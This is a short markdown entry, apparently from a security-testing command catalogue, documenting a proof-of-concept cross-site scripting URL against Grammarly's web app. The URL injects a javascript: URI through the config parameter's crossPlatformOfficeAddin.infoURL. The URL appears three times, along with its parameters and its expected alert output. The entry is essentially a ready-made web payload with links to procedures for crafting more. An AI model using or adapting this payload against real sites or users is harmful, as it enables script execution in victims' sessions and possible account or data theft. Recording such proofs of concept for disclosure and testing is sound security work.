---
data: >-
  https://app.grammarly.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22javascript:alert(document.domain)//%22}}
tags:
  - xss
  - poc
  - grammarly
type: command
executor: bash
platforms:
  - Web
id: 0928d672-3936-4d6f-accc-4e3744bc03d0
created_at: '2025-12-13T23:56:20.260Z'
updated_at: '2025-12-13T23:56:20.260Z'
verified: false
validated: true
submitted: true
---
# grammarly-xss-poc-office-addin

## Command

```bash
https://app.grammarly.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22javascript:alert(document.domain)//%22}}
```

## Description

PoC URL to inject XSS into office add-in info URL, overriding crossPlatformOfficeAddin.infoURL.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `config` | JSON object overriding crossPlatformOfficeAddin.infoURL to javascript:alert | Yes |

## Examples

### Basic Usage

```bash
https://app.grammarly.com/?config={%22crossPlatformOfficeAddin%22:{%22infoURL%22:%22javascript:alert(document.domain)//%22}}
```

## Expected Output

Triggers alert(document.domain) when accessing office add-in info.

## Related

- [[procedures/Craft-PoC-URLs-for-Config-Injection]]
- [[procedures/Trigger-XSS-via-Affected-Features]]
